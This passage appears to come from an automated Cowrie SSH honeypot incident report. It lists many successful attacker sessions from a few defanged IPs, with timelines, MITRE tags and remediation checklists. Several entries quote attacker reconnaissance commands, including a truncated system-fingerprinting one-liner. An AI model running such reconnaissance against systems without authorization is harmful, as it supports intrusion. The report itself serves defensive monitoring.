| `2026-06-27 12:20:07` | `cowrie.login.success` |
| `2026-06-27 12:20:08` | `cowrie.session.params` |
| `2026-06-27 12:20:08` | `cowrie.command.input` |
| `2026-06-27 12:20:08` | `cowrie.log.closed` |
| `2026-06-27 12:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f58be4e79a62

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:20 |
| **Last Seen** | 2026-06-27 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:20:30` | `cowrie.session.connect` |
| `2026-06-27 12:20:30` | `cowrie.client.version` |
| `2026-06-27 12:20:30` | `cowrie.client.kex` |
| `2026-06-27 12:20:31` | `cowrie.login.success` |
| `2026-06-27 12:20:32` | `cowrie.session.params` |
| `2026-06-27 12:20:32` | `cowrie.command.input` |
| `2026-06-27 12:20:32` | `cowrie.command.input` |
| `2026-06-27 12:20:32` | `cowrie.command.input` |
| `2026-06-27 12:20:32` | `cowrie.command.input` |
| `2026-06-27 12:20:32` | `cowrie.log.closed` |
| `2026-06-27 12:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3824c33f90c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:20 |
| **Last Seen** | 2026-06-27 12:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:20:57` | `cowrie.session.connect` |
| `2026-06-27 12:20:57` | `cowrie.client.version` |
| `2026-06-27 12:20:57` | `cowrie.client.kex` |
| `2026-06-27 12:20:58` | `cowrie.login.success` |
| `2026-06-27 12:20:58` | `cowrie.session.params` |
| `2026-06-27 12:20:58` | `cowrie.command.input` |
| `2026-06-27 12:20:59` | `cowrie.log.closed` |
| `2026-06-27 12:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde37d83cca2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:21 |
| **Last Seen** | 2026-06-27 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:21:54` | `cowrie.session.connect` |
| `2026-06-27 12:21:54` | `cowrie.client.version` |
| `2026-06-27 12:21:54` | `cowrie.client.kex` |
| `2026-06-27 12:21:54` | `cowrie.login.success` |
| `2026-06-27 12:21:55` | `cowrie.session.params` |
| `2026-06-27 12:21:55` | `cowrie.command.input` |
| `2026-06-27 12:21:55` | `cowrie.log.closed` |
| `2026-06-27 12:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c54dc8cd1670

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:22 |
| **Last Seen** | 2026-06-27 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:22:45` | `cowrie.session.connect` |
| `2026-06-27 12:22:45` | `cowrie.client.version` |
| `2026-06-27 12:22:45` | `cowrie.client.kex` |
| `2026-06-27 12:22:45` | `cowrie.login.success` |
| `2026-06-27 12:22:46` | `cowrie.session.params` |
| `2026-06-27 12:22:46` | `cowrie.command.input` |
| `2026-06-27 12:22:46` | `cowrie.log.closed` |
| `2026-06-27 12:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c528886ef8ae

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:23 |
| **Last Seen** | 2026-06-27 12:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:23:36` | `cowrie.session.connect` |
| `2026-06-27 12:23:36` | `cowrie.client.version` |
| `2026-06-27 12:23:36` | `cowrie.client.kex` |
| `2026-06-27 12:23:36` | `cowrie.login.success` |
| `2026-06-27 12:23:37` | `cowrie.session.params` |
| `2026-06-27 12:23:37` | `cowrie.command.input` |
| `2026-06-27 12:23:37` | `cowrie.log.closed` |
| `2026-06-27 12:23:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e089cc9b138

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:24 |
| **Last Seen** | 2026-06-27 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:24:29` | `cowrie.session.connect` |
| `2026-06-27 12:24:29` | `cowrie.client.version` |
| `2026-06-27 12:24:29` | `cowrie.client.kex` |
| `2026-06-27 12:24:29` | `cowrie.login.success` |
| `2026-06-27 12:24:30` | `cowrie.session.params` |
| `2026-06-27 12:24:30` | `cowrie.command.input` |
| `2026-06-27 12:24:30` | `cowrie.command.input` |
| `2026-06-27 12:24:30` | `cowrie.command.input` |
| `2026-06-27 12:24:30` | `cowrie.command.input` |
| `2026-06-27 12:24:30` | `cowrie.log.closed` |
| `2026-06-27 12:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99e22ee896b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:24 |
| **Last Seen** | 2026-06-27 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:24:30` | `cowrie.session.connect` |
| `2026-06-27 12:24:30` | `cowrie.client.version` |
| `2026-06-27 12:24:30` | `cowrie.client.kex` |
| `2026-06-27 12:24:30` | `cowrie.login.success` |
| `2026-06-27 12:24:31` | `cowrie.session.params` |
| `2026-06-27 12:24:31` | `cowrie.command.input` |
| `2026-06-27 12:24:31` | `cowrie.log.closed` |
| `2026-06-27 12:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8135846ddc8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:25 |
| **Last Seen** | 2026-06-27 12:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:25:18` | `cowrie.session.connect` |
| `2026-06-27 12:25:18` | `cowrie.client.version` |
| `2026-06-27 12:25:18` | `cowrie.client.kex` |
| `2026-06-27 12:25:18` | `cowrie.login.success` |
| `2026-06-27 12:25:19` | `cowrie.session.params` |
| `2026-06-27 12:25:19` | `cowrie.command.input` |
| `2026-06-27 12:25:19` | `cowrie.log.closed` |
| `2026-06-27 12:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df350240381

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:26 |
| **Last Seen** | 2026-06-27 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:26:05` | `cowrie.session.connect` |
| `2026-06-27 12:26:05` | `cowrie.client.version` |
| `2026-06-27 12:26:05` | `cowrie.client.kex` |
| `2026-06-27 12:26:06` | `cowrie.login.success` |
| `2026-06-27 12:26:07` | `cowrie.session.params` |
| `2026-06-27 12:26:07` | `cowrie.command.input` |
| `2026-06-27 12:26:07` | `cowrie.log.closed` |
| `2026-06-27 12:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-650e0c1b0620

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:26 |
| **Last Seen** | 2026-06-27 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:26:55` | `cowrie.session.connect` |
| `2026-06-27 12:26:55` | `cowrie.client.version` |
| `2026-06-27 12:26:55` | `cowrie.client.kex` |
| `2026-06-27 12:26:55` | `cowrie.login.success` |
| `2026-06-27 12:26:56` | `cowrie.session.params` |
| `2026-06-27 12:26:56` | `cowrie.command.input` |
| `2026-06-27 12:26:56` | `cowrie.log.closed` |
| `2026-06-27 12:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683a83ec8db9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:27 |
| **Last Seen** | 2026-06-27 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:27:44` | `cowrie.session.connect` |
| `2026-06-27 12:27:44` | `cowrie.client.version` |
| `2026-06-27 12:27:45` | `cowrie.client.kex` |
| `2026-06-27 12:27:45` | `cowrie.login.success` |
| `2026-06-27 12:27:46` | `cowrie.session.params` |
| `2026-06-27 12:27:46` | `cowrie.command.input` |
| `2026-06-27 12:27:46` | `cowrie.log.closed` |
| `2026-06-27 12:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bef331d1075

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:28 |
| **Last Seen** | 2026-06-27 12:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:28:35` | `cowrie.session.connect` |
| `2026-06-27 12:28:35` | `cowrie.client.version` |
| `2026-06-27 12:28:35` | `cowrie.client.kex` |
| `2026-06-27 12:28:35` | `cowrie.login.success` |
| `2026-06-27 12:28:36` | `cowrie.session.params` |
| `2026-06-27 12:28:36` | `cowrie.command.input` |
| `2026-06-27 12:28:36` | `cowrie.log.closed` |
| `2026-06-27 12:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b921dd9a088

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 12:28 |
| **Last Seen** | 2026-06-27 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:28:52` | `cowrie.session.connect` |
| `2026-06-27 12:28:52` | `cowrie.client.version` |
| `2026-06-27 12:28:52` | `cowrie.client.kex` |
| `2026-06-27 12:28:54` | `cowrie.login.success` |
| `2026-06-27 12:28:55` | `cowrie.session.params` |
| `2026-06-27 12:28:55` | `cowrie.command.input` |
| `2026-06-27 12:28:56` | `cowrie.log.closed` |
| `2026-06-27 12:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0de2c13c58c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:29 |
| **Last Seen** | 2026-06-27 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:29:24` | `cowrie.session.connect` |
| `2026-06-27 12:29:24` | `cowrie.client.version` |
| `2026-06-27 12:29:25` | `cowrie.client.kex` |
| `2026-06-27 12:29:25` | `cowrie.login.success` |
| `2026-06-27 12:29:26` | `cowrie.session.params` |
| `2026-06-27 12:29:26` | `cowrie.command.input` |
| `2026-06-27 12:29:26` | `cowrie.log.closed` |
| `2026-06-27 12:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900797ad6bd9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]13` |
| **First Seen** | 2026-06-27 12:29 |
| **Last Seen** | 2026-06-27 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:29:31` | `cowrie.session.connect` |
| `2026-06-27 12:29:31` | `cowrie.client.version` |
| `2026-06-27 12:29:31` | `cowrie.client.kex` |
| `2026-06-27 12:29:32` | `cowrie.login.success` |
| `2026-06-27 12:29:32` | `cowrie.session.params` |
| `2026-06-27 12:29:32` | `cowrie.command.input` |
| `2026-06-27 12:29:32` | `cowrie.command.input` |
| `2026-06-27 12:29:32` | `cowrie.command.input` |
| `2026-06-27 12:29:32` | `cowrie.command.input` |
| `2026-06-27 12:29:33` | `cowrie.log.closed` |
| `2026-06-27 12:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]13` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78df575c6663

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 12:29 |
| **Last Seen** | 2026-06-27 12:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:29:48` | `cowrie.session.connect` |
| `2026-06-27 12:29:49` | `cowrie.client.version` |
| `2026-06-27 12:29:49` | `cowrie.client.kex` |
| `2026-06-27 12:29:55` | `cowrie.login.success` |
| `2026-06-27 12:29:58` | `cowrie.session.params` |
| `2026-06-27 12:29:58` | `cowrie.command.input` |
| `2026-06-27 12:30:00` | `cowrie.log.closed` |
| `2026-06-27 12:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa5be068ce6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:30 |
| **Last Seen** | 2026-06-27 12:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:30:13` | `cowrie.session.connect` |
| `2026-06-27 12:30:13` | `cowrie.client.version` |
| `2026-06-27 12:30:13` | `cowrie.client.kex` |
| `2026-06-27 12:30:14` | `cowrie.login.success` |
| `2026-06-27 12:30:14` | `cowrie.session.params` |
| `2026-06-27 12:30:14` | `cowrie.command.input` |
| `2026-06-27 12:30:15` | `cowrie.log.closed` |
| `2026-06-27 12:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62b47ec0601f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:31 |
| **Last Seen** | 2026-06-27 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:31:00` | `cowrie.session.connect` |
| `2026-06-27 12:31:00` | `cowrie.client.version` |
| `2026-06-27 12:31:00` | `cowrie.client.kex` |
| `2026-06-27 12:31:00` | `cowrie.login.success` |
| `2026-06-27 12:31:01` | `cowrie.session.params` |
| `2026-06-27 12:31:01` | `cowrie.command.input` |
| `2026-06-27 12:31:01` | `cowrie.log.closed` |
| `2026-06-27 12:31:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13d3d3a6bc7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:31 |
| **Last Seen** | 2026-06-27 12:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:31:46` | `cowrie.session.connect` |
| `2026-06-27 12:31:46` | `cowrie.client.version` |
| `2026-06-27 12:31:46` | `cowrie.client.kex` |
| `2026-06-27 12:31:46` | `cowrie.login.success` |
| `2026-06-27 12:31:47` | `cowrie.session.params` |
| `2026-06-27 12:31:47` | `cowrie.command.input` |
| `2026-06-27 12:31:47` | `cowrie.log.closed` |
| `2026-06-27 12:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95da35c4485d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:32 |
| **Last Seen** | 2026-06-27 12:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:32:33` | `cowrie.session.connect` |
| `2026-06-27 12:32:33` | `cowrie.client.version` |
| `2026-06-27 12:32:33` | `cowrie.client.kex` |
| `2026-06-27 12:32:33` | `cowrie.login.success` |
| `2026-06-27 12:32:34` | `cowrie.session.params` |
| `2026-06-27 12:32:34` | `cowrie.command.input` |
| `2026-06-27 12:32:34` | `cowrie.log.closed` |
| `2026-06-27 12:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781300c0a34f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:33 |
| **Last Seen** | 2026-06-27 12:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:33:20` | `cowrie.session.connect` |
| `2026-06-27 12:33:20` | `cowrie.client.version` |
| `2026-06-27 12:33:21` | `cowrie.client.kex` |
| `2026-06-27 12:33:21` | `cowrie.login.success` |
| `2026-06-27 12:33:22` | `cowrie.session.params` |
| `2026-06-27 12:33:22` | `cowrie.command.input` |
| `2026-06-27 12:33:22` | `cowrie.log.closed` |
| `2026-06-27 12:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df9ff6411cc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:34 |
| **Last Seen** | 2026-06-27 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:34:10` | `cowrie.session.connect` |
| `2026-06-27 12:34:10` | `cowrie.client.version` |
| `2026-06-27 12:34:10` | `cowrie.client.kex` |
| `2026-06-27 12:34:10` | `cowrie.login.success` |
| `2026-06-27 12:34:11` | `cowrie.session.params` |
| `2026-06-27 12:34:11` | `cowrie.command.input` |
| `2026-06-27 12:34:11` | `cowrie.log.closed` |
| `2026-06-27 12:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89cc9883b6dc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 12:35 |
| **Last Seen** | 2026-06-27 12:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 12:35:00` | `cowrie.session.connect` |
| `2026-06-27 12:35:00` | `cowrie.client.version` |
| `2026-06-27 12:35:00` | `cowrie.client.kex` |
| `2026-06-27 12:35:00` | `cowrie.login.success` |
| `2026-06-27 12:35:01` | `cowrie.session.params` |
| `2026-06-27 12:35:01` | `cowrie.command.input` |
| `2026-06-27 12:35:01` | `cowrie.log.closed` |
| `2026-06-27 12:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
